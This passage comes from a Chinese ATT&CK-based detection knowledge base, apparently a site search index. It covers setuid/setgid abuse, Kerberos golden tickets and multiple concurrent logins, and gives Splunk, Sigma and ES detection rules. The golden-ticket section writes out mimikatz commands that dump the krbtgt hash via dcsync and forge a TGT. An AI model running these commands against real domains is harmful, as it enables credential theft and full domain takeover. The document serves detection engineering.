<p>\u6ce8\uff1a\u5728UNIX\u7cfb\u7edf\u5bb6\u65cf\u91cc\uff0c\u6587\u4ef6\u6216\u76ee\u5f55\u6743\u9650\u7684\u63a7\u5236\u5206\u522b\u4ee5\u8bfb\u53d6\uff0c\u5199\u5165\uff0c\u6267\u884c3\u79cd\u4e00\u822c\u6743\u9650\u6765\u533a\u5206\uff0c\u53e6\u67093\u79cd\u7279\u6b8a\u6743\u9650</p> <p>\u53ef\u4f9b\u8fd0\u7528\uff0c\u518d\u642d\u914d\u62e5\u6709\u8005\u4e0e\u6240\u5c5e\u7fa4\u7ec4\u7ba1\u7406\u6743\u9650\u8303\u56f4\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528chmod\u6307\u4ee4\u53bb\u53d8\u66f4\u6587\u4ef6\u4e0e\u76ee\u5f55\u7684\u6743\u9650\uff0c\u8bbe\u7f6e\u65b9\u5f0f</p> <p>\u91c7\u7528\u6587\u5b57\u6216\u6570\u5b57\u4ee3\u53f7\u7686\u53ef\u3002\u7b26\u53f7\u8fde\u63a5\u7684\u6743\u9650\u65e0\u6cd5\u53d8\u66f4\uff0c\u5982\u679c\u60a8\u5bf9\u7b26\u53f7\u8fde\u63a5\u4fee\u6539\u6743\u9650\uff0c\u5176\u6539\u53d8\u4f1a\u4f5c\u7528\u5728\u88ab\u8fde\u63a5\u7684\u539f\u59cb</p> <p>\u6587\u4ef6\u3002\u6743\u9650\u8303\u56f4\u7684\u8868\u793a\u6cd5\u5982\u4e0b\uff1a</p> <p>u\uff1aUser\uff0c\u5373\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u62e5\u6709\u8005\u3002</p> <p>g\uff1aGroup\uff0c\u5373\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6240\u5c5e\u7fa4\u7ec4\u3002</p> <p>o\uff1aOther\uff0c\u9664\u4e86\u6587\u4ef6\u6216\u76ee\u5f55\u62e5\u6709\u8005\u6216\u6240\u5c5e\u7fa4\u7ec4\u4e4b\u5916\uff0c\u5176\u4ed6\u7528\u6237\u7686\u5c5e\u4e8e\u8fd9\u4e2a\u8303\u56f4\u3002</p> <p>a\uff1aAll\uff0c\u5373\u5168\u90e8\u7684\u7528\u6237\uff0c\u5305\u542b\u62e5\u6709\u8005\uff0c\u6240\u5c5e\u7fa4\u7ec4\u4ee5\u53ca\u5176\u4ed6\u7528\u6237\u3002</p> <p>\u6709\u5173\u6743\u9650\u4ee3\u53f7\u7684\u90e8\u5206\uff0c\u5217\u8868\u4e8e\u4e0b\uff1a</p> <p>r\uff1a\u8bfb\u53d6\u6743\u9650\uff0c\u6570\u5b57\u4ee3\u53f7\u4e3a\"4\"\u3002</p> <p>w\uff1a\u5199\u5165\u6743\u9650\uff0c\u6570\u5b57\u4ee3\u53f7\u4e3a\"2\"\u3002</p> <p>x\uff1a\u6267\u884c\u6216\u5207\u6362\u6743\u9650\uff0c\u6570\u5b57\u4ee3\u53f7\u4e3a\"1\"\u3002</p> <p>-\uff1a\u4e0d\u5177\u4efb\u4f55\u6743\u9650\uff0c\u6570\u5b57\u4ee3\u53f7\u4e3a\"0\"\u3002</p> <p>s\uff1a\u7279\u6b8a?b&gt;\u529f\u80fd\u8bf4\u660e\uff1a\u53d8\u66f4\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6743\u9650\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_4","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>bash\u5386\u53f2\u8bb0\u5f55</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_5","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_6","title":"\u65b9\u6cd5\u4e00/","text":"<p>icbc@icbc:/hacker$ ls -l</p> <p>-rw-r--r--  1 root root    0 7\u6708  19 17:22 bas.txt</p> <p>icbc@icbc:/hacker$ sudo chmod u+s bas.txt</p> <p>icbc@icbc:/hacker$ ls -l</p> <p>-rwSr--r--  1 root root    0 7\u6708  19 17:22 bas.txt</p> <p>icbc@icbc:/hacker$ sudo chmod g+s bas.txt</p> <p>icbc@icbc:/hacker$ ls -l</p> <p>-rwSr-Sr--  1 root root    0 7\u6708  19 17:22 bas.txt</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_7","title":"\u65b9\u6cd5\u4e8c/","text":"<p>icbc@icbc:/hacker$ ls -l</p> <p>-rwxr-xr-x  1 root root    0 8\u6708  28 15:16 admin.txt</p> <p>icbc@icbc:/hacker$ sudo chmod 4777 admin.txt</p> <p>icbc@icbc:/hacker$ ls -l</p> <p>-rwsrwxrwx  1 root root    0 8\u6708  28 15:16 admin.txt</p> <p>icbc@icbc:/hacker$ sudo chmod 2777 admin.txt</p> <p>icbc@icbc:/hacker$ ls -l</p> <p>-rwxrwsrwx  1 root root    0 8\u6708  28 15:16 admin.txt</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_8","title":"\u6d4b\u8bd5\u7559\u75d5","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_9","title":"\u65b9\u6cd5\u4e00 /","text":"<p>icbc@icbc:/hacker$ history</p> <p>650  chmod u+s bas.txt</p> <p>651  sudo chmod u+s bas.txt</p> <p>652  ls -l</p> <p>653  sudo chmod g+s bas.txt</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_10","title":"\u65b9\u6cd5\u4e8c /","text":"<p>icbc@icbc:/hacker$ history</p> <p>683  sudo chmod 4777 admin.txt</p> <p>684  ls -l</p> <p>685  sudo chmod 2777 admin.txt</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_11","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>splunk\u68c0\u6d4b\u89c4\u5219\uff1aindex=linux sourcetype=bash_history \"chmod <code>4***</code>\" OR \"chmod <code>2***</code>\" OR \"chmod u+s\" OR \"chmod g+s\" | table host,user_name,bash_command</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_12","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1548-001</p> <p>https://attack.mitre.org/techniques/T1548/001/</p> <p>linux\u6587\u4ef6\u7279\u6b8a\u6743\u9650</p> <p>https://www.cnblogs.com/patriot/p/7874725.html</p> <p>linux\u4e2dchmod\u547d\u4ee4\u8be6\u89e3</p> <p>https://www.cnblogs.com/lianstyle/p/8571975.html</p> <p>linux\u4e0b\u7684chmod\u53c2\u6570\u8be6\u89e3</p> <p>https://blog.csdn.net/taiyang1987912/article/details/41121131</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/","title":"T1550-003-win-\u9ec4\u91d1\u7968\u636e","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u88ab\u76d7\u7684Kerberos\u7968\u8bc1\u201c\u4f20\u9012\u7968\u8bc1\u201d\uff0c\u4f7f\u5176\u5728\u73af\u5883\u4e2d\u6a2a\u5411\u79fb\u52a8\uff0c\u4ece\u800c\u7ed5\u8fc7\u6b63\u5e38\u7684\u7cfb\u7edf\u8bbf\u95ee\u63a7\u5236\u3002\u4f20\u9012\u7968\u8bc1\uff08PtT\uff09\u662f\u4e00\u79cd\u4f7f\u7528Kerberos\u7968\u8bc1\u5bf9\u7cfb\u7edf\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u7684\u65b9\u6cd5\uff0c\u65e0\u9700\u8bbf\u95ee\u5e10\u6237\u5bc6\u7801\u3002Kerberos\u8eab\u4efd\u9a8c\u8bc1\u53ef\u4ee5\u7528\u4f5c\u6a2a\u5411\u79fb\u52a8\u5230\u8fdc\u7a0b\u7cfb\u7edf\u7684\u7b2c\u4e00\u6b65\u3002</p> <p>\u5728\u8fd9\u79cd\u6280\u672f\u4e2d\uff0c\u6709\u6548\u7684Kerberos\u7968\u6709\u6548\u7684\u5e10\u6237\u88ab\u6355\u83b7OS\u51ed\u8bc1\u503e\u9500\u3002\u53d6\u51b3\u4e8e\u8bbf\u95ee\u7ea7\u522b\uff0c\u53ef\u4ee5\u83b7\u5f97\u7528\u6237\u7684\u670d\u52a1\u7968\u8bc1\u6216\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u3002\u670d\u52a1\u7968\u8bc1\u5141\u8bb8\u8bbf\u95ee\u7279\u5b9a\u8d44\u6e90\uff0c\u800cTGT\u53ef\u4ee5\u7528\u4e8e\u4ece\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u8bf7\u6c42\u670d\u52a1\u7968\u8bc1\u4ee5\u8bbf\u95ee\u7528\u6237\u6709\u6743\u8bbf\u95ee\u7684\u4efb\u4f55\u8d44\u6e90\u3002</p> <p>\u53ef\u4ee5\u4e3a\u4f7f\u7528Kerberos\u4f5c\u4e3a\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\u7684\u670d\u52a1\u83b7\u53d6Silver Ticket\uff0c\u5e76\u7528\u4e8e\u751f\u6210\u7968\u8bc1\u4ee5\u8bbf\u95ee\u8be5\u7279\u5b9a\u8d44\u6e90\u548c\u627f\u8f7d\u8be5\u8d44\u6e90\u7684\u7cfb\u7edf\uff08\u4f8b\u5982\uff0cSharePoint\uff09\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528\u5bc6\u94a5\u5206\u53d1\u670d\u52a1\u5e10\u6237KRBTGT\u5e10\u6237NTLM\u54c8\u5e0c\u6765\u83b7\u53d6\u57df\u7684Golden Ticket\uff0c\u8fd9\u53ef\u4ee5\u4e3aActive Directory\u4e2d\u7684\u4efb\u4f55\u5e10\u6237\u751f\u6210TGT\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u9ec4\u91d1\u7968\u636e\uff08golden ticket\uff09\uff1a\u4f2a\u9020\u7968\u636e\u6388\u4e88\u7968\u636e\uff08TGT\uff09\uff0c\u4e5f\u88ab\u79f0\u4e3a\u8ba4\u8bc1\u7968\u636e\u3002\u4e0e\u5176\u8bf4\u662f\u4e00\u79cd\u653b\u51fb\u65b9\u5f0f\uff0c\u4e0d\u5982\u8bf4\u662f\u4e00\u79cd\u540e\u95e8\uff0c\u5f53\u57df\u63a7\u6743\u9650\u6389\u540e\uff0c\u518d\u91cd\u65b0\u83b7\u53d6\u6743\u9650\uff0c\u56e0\u4e3a\u5e38\u89c1\u7684\u5728\u57df\u4e2d\u7ba1\u7406\u5458\u77e5\u9053\u81ea\u5df1\u88ab\u5165\u4fb5\u4e86 \u5f80\u5f80\u53ea\u662f\u7b80\u5355\u7684\u4fee\u6539\u57df\u7ba1\u7684\u8d26\u53f7 \u6070\u6070krbtgt\u5374\u88ab\u5ffd\u7565\u2026</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_4","title":"\u6d4b\u8bd5\u73af\u5883","text":"<p>Windows server 2016\uff08AD\u57df\u63a7\uff09</p> <p>Win 7\uff08\u9776\u673a\uff09</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_5","title":"\u6d4b\u8bd5\u8fc7\u7a0b","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#dc","title":"\u5c1d\u8bd5\u8bbf\u95eeDC\u76ee\u5f55","text":"<pre><code>dir \\\\ICBC.abcc.org\\c$\\\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#krbtgthashsidmimikatzexe","title":"\u5bfc\u51fakrbtgt\u7528\u6237\u7684hash\u548csid(\u4f7f\u7528mimikatz.exe\u5de5\u5177)","text":"<pre><code>lsadump::dcsync /domain:abcc.org /user:krbtgt    #domian\uff1a\u540e\u9762\u662f\u57df\u63a7\u540d  user\u540e\u9762\u662fkrbtgt\u7528\u6237\n</code></pre> <p>\u5728\u57df\u5185\u5176\u4ed6Client(\u7528\u6237\u673a\u5668)\u4e0a\u4f7f\u7528\u5176\u4ed6\u57df\u7ba1\u7406\u5458\u6765\u6293\u53d6krbtgt\u7528\u6237\u7684hash\u548csid(\u4f7f\u7528mimikatz.exe\u5de5\u5177)\uff0c\u8fd9\u91cc\u547d\u4ee4\u548c\u4e0a\u9762\u7684\u547d\u4ee4\u662f\u4e00\u6837\u7684\u3002\u4e5f\u53ef\u4ee5\u5229\u7528\u5176\u5b83\u65b9\u6cd5\u83b7\u53d6krbtgt\u7684NTML hash</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#client","title":"\u6e05\u9664\u81ea\u5df1Client\u7aef(\u57df\u5185\u5176\u4ed6\u673a\u5668)\u7684\u7968\u636e","text":"<p>\u5728\u57df\u63a7\u4e0a\u9762\u6210\u529f\u6293\u53d6\u4e86hash\u548csid\uff0c\u5c06hash\u548csid\u590d\u5236\u5230\u5176\u4ed6\u57df\u5185\u673a\u5668\u4e2d\uff0c\u4e5f\u5c31\u662fClient\u7aef\uff0c\u7136\u540e\u5728mimikatz.exe\u6267\u884ckerberos::list\u67e5\u770b\u6211\u4eec\u5f53\u524d\u7684\u7968\u636e\u3002</p> <p></p> <p>\u5982\u679c\u5b58\u5728\u5176\u5b83\u51ed\u636e\uff0c\u53ef\u4ee5\u4f7f\u7528kerberos::purge\u6e05\u9664\u5f53\u524d\u7528\u6237\u7968\u636e\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#tgt","title":"\u4f2a\u9020TGT\u7968\u636e","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_6","title":"\u65b9\u6cd5\u4e00","text":"<pre><code>mimikatz.exe \"kerberos::golden /domain:&lt;\u57df\u540d&gt; /sid:&lt;\u57dfSID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;\u4efb\u610f\u7528\u6237\u540d&gt; /ptt\" exit\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_7","title":"\u9a8c\u8bc1\u653b\u51fb\u6548\u679c","text":"<pre><code>dir \\\\ICBC.abcc.org\\c$\\\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_8","title":"\u65b9\u6cd5\u4e8c","text":"<pre><code>mimikatz# kerberos::gloden /domain:*.com /sid:&lt;\u57dfSID&gt; /krbtgt: &lt;KRBTGT NTLM Hash&gt; /user:&lt;\u4efb\u610f\u7528\u6237\u540d&gt; /ticket:test.kribi\nor\nmimikatz# kerberos::gloden /domain:*.com /sid: &lt;\u57dfSID&gt; /aes256: &lt;KRBTGT aes256&gt; /user: &lt;\u4efb\u610f\u7528\u6237\u540d&gt; /ticket:test.kribi\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#kribi","title":"\u5bfc\u5165*.kribi\u6587\u4ef6","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_9","title":"\u9a8c\u8bc1\u662f\u5426\u6210\u529f","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_10","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6b63\u5e38\u65e5\u5fd7\u75d5\u8ff9</p> <p></p> <p>\u5f02\u5e38\u65e5\u5fd7\u75d5\u8ff9</p> <p></p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_11","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: windows\u672c\u5730\u8d26\u6237\u64cd\u7eb5\ndescription: win7\u6d4b\u8bd5\nreferences:\ntags: T1550-003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4624  #\u8d26\u6237\u767b\u5f55\n        Account domain: '*.*' #\u53ef\u53c2\u8003\u793a\u4f8b\u65e5\u5fd7\u8fdb\u884c\u7406\u89e3\n    selection2:\n        EventID: 4672  #\u7279\u6b8a\u767b\u5f55\n        Account domain: _ #\u8d26\u6237\u57df\u4e3a\u7a7a\n    timeframe: last 5s\n    condition: all of them\nlevel: medium\n</code></pre>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_12","title":"\u5efa\u8bae","text":"<p>\u6700\u540e\uff0c\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0cmimikatz\u6700\u65b0\u7248\u672c\u5df2\u7ecf\u66f4\u65b0\u4fee\u590d\u4e86\u4e00\u4e0b\u95ee\u9898\uff0c\u901a\u8fc7\u4e0a\u8ff0\u6b64\u7279\u5f81\u68c0\u6d4b\u9ec4\u91d1\u7968\u636e\u53ef\u80fd\u4f1a\u4ea7\u751f\u8bef\u62a5\u6216\u8005\u6f0f\u6d1e\uff0c\u5efa\u8bae\u91c7\u7528\u504f\u5411\u6d41\u91cf\u4fa7\u7684\u68c0\u6d4b\u65b9\u6cd5\u8fdb\u884c\u68c0\u6d4b\uff0c\u601d\u8def\u5982\u4e0b\u3002</p> <p>1.AS-REP\u8fd4\u56de\u7684Ticket\u5b57\u6bb5\u4e2d\uff0c\u867d\u7136\u7ecf\u8fc7krbtgt\u5bc6\u7801\u7684\u52a0\u5bc6\uff0c\u4f46\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u5bf9\u5176\u8ba1\u7b97\u552f\u4e00\u6458\u8981\u503c\u3002</p> <p>2.\u8ddf\u8e2a\u6bcf\u4e00\u6b21\u7684AS-REP TGT\u7968\u636e\u9881\u53d1\uff0c\u8bb0\u5f55\u4e0bTicket Hash\uff0c\u5b58\u5165\u5217\u8868A\u3002</p> <p>3.\u5bf9\u6bcf\u4e00\u6b21TGS-REQ\u4e2dTGT Hash\u8fdb\u884c\u786e\u8ba4\uff0c\u5224\u65ad\u8be5\u503c\u662f\u5426\u5b58\u5728\u4e8e\u5df2\u77e5\u9881\u53d1\u8fc7\u7684TGT\u5217\u8868A\u4e2d\u3002\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u5219\u5c5e\u4e8e\u4f2a\u9020\u7684TGT\uff0c\u5373\u9ec4\u91d1\u7968\u636e\u3002</p> <p>4.\u5217\u8868A\u7684\u5185\u5bb9\u53ef\u8bbe\u7f6e\u8fc7\u671f\u65f6\u95f4\uff0cTGT\u548cST\u7684\u9ed8\u8ba4\u6700\u5927\u6709\u6548\u671f\u90fd\u662f10\u5c0f\u65f6\u3002</p>"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_13","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1550-003</p> <p>https://attack.mitre.org/techniques/T1550/003/</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/","title":"T1078-003-windows-\u591a\u8d26\u6237\u540c\u65f6\u767b\u9646","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u83b7\u53d6\u5e76\u6ee5\u7528\u672c\u5730\u5e10\u6237\u7684\u51ed\u636e\uff0c\u4ee5\u83b7\u53d6\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u6301\u4e45\u6027\uff0c\u6743\u9650\u63d0\u5347\u6216\u9632\u5fa1\u9003\u907f\u3002\u672c\u5730\u5e10\u6237\u662f\u7531\u7ec4\u7ec7\u914d\u7f6e\u7684\u5e10\u6237\uff0c\u4f9b\u7528\u6237\uff0c\u8fdc\u7a0b\u652f\u6301\uff0c\u670d\u52a1\u4f7f\u7528\u6216\u5728\u5355\u4e2a\u7cfb\u7edf\u6216\u670d\u52a1\u4e0a\u8fdb\u884c\u7ba1\u7406\u3002</p> <p>\u901a\u8fc7OS\u51ed\u636e\u8f6c\u50a8\uff0c\u672c\u5730\u5e10\u6237\u4e5f\u53ef\u80fd\u88ab\u6ee5\u7528\u4ee5\u63d0\u5347\u7279\u6743\u548c\u6536\u96c6\u51ed\u636e\u3002\u4e3a\u4e86\u7279\u6743\u5347\u7ea7\u548c\u6a2a\u5411\u79fb\u52a8\uff0c\u5bc6\u7801\u91cd\u7528\u53ef\u80fd\u5141\u8bb8\u6ee5\u7528\u7f51\u7edc\u4e0a\u7684\u4e00\u7ec4\u8ba1\u7b97\u673a\u4e0a\u7684\u672c\u5730\u5e10\u6237\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u591a\u4e2a\u7528\u6237\u540c\u65f6\u6216\u8005\u5728\u540c\u4e00\u5c0f\u65f6\u5185\u767b\u5f55\u5230\u540c\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\uff0c\u901a\u5e38\u4e0d\u4f1a\u51fa\u73b0\u5728\u6211\u4eec\u89c2\u5bdf\u5230\u7684\u7f51\u7edc\u4e2d\u3002</p> <p>\u767b\u5f55\u4e8b\u4ef6\u662f\u9002\u7528\u4e8eWindows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u7684Windows\uff0c\u9002\u7528\u4e8eVista\u4e4b\u540e\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a4624\u3002\u9002\u7528\u4e8eVista\u4e4b\u524d\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a528/540\u3002Windows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u7684\u6ce8\u9500\u4e8b\u4ef6ID\u4e3a4634\uff0cVista\u4e4b\u524d\u7684\u6ce8\u9500\u4e8b\u4ef6ID\u4e3a538\u3002\u767b\u5f55\u7c7b\u578b2,3,9\u548c10\u662f\u503c\u5f97\u5173\u6ce8\u7684\u3002\u6709\u5173\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605Microsoft\u7684\u201c \u5ba1\u6838\u767b\u5f55\u4e8b\u4ef6\u201d\u9875\u9762\u4e0a\u7684\u201c\u767b\u5f55\u7c7b\u578b\u201d\u8868\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u5173\u6ce8windows\u767b\u9646\u4e8b\u4ef6\uff0c\u5e76\u7559\u610f\u767b\u9646\u7c7b\u578b\u3002\u9002\u7528\u4e8eVista\u4e4b\u540e\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a4624\uff1b\u9002\u7528\u4e8eVista\u4e4b\u524d\u7684\u7248\u672c\uff0c\u767b\u9646\u4e8b\u4ef6ID\u4e3a528/540\uff1b\u767b\u5f55\u7c7b\u578b2,3,9\u548c10\u662f\u503c\u5f97\u5173\u6ce8\u7684\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#es","title":"es\u89c4\u5219","text":"<p>\u601d\u8def\uff1a\u7edf\u8ba1\u5728\u4e00\u5c0f\u65f6\u5185\uff0c\u540c\u4e00\u53f0\u4e3b\u673a\u4e0a\uff0c\u767b\u9646\u7684\u7528\u6237\u662f\u5426\u5927\u4e8e\u4e00\u4e2a</p> <pre><code>users_list = search UserSession:Login\nusers_grouped = group users_list by hostname\nusers_grouped = from users_grouped select min(time) as earliest_time, max(time) as latest_time count(user) as user_count\nmultiple_logins = filter users_grouped where (latest_time - earliest_time &lt;= 1 hour and user_count &gt; 1)\noutput multiple_logins\n</code></pre>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%A4%9A%E8%B4%A6%E6%88%B7%E5%90%8C%E6%97%B6%E7%99%BB%E9%99%86/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1078-003</p> 